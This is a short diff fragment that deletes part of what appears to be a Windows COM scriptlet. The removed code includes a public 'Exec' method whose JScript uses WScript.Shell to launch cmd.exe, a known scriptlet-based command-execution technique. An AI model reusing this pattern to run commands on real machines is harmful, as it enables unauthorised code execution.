@@ -195,22 +195,3 @@ try {
 } catch (e) {
     debug(e.message);
 }
-		]]>
-</script>
-</registration>
-
-<public>
-    <method name="Exec"></method>
-</public>
-<script language="JScript">
-<![CDATA[
-	
-	function Exec()
-	{
-		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
-	}
-	
-]]>
-</script>
-
-</scriptlet>
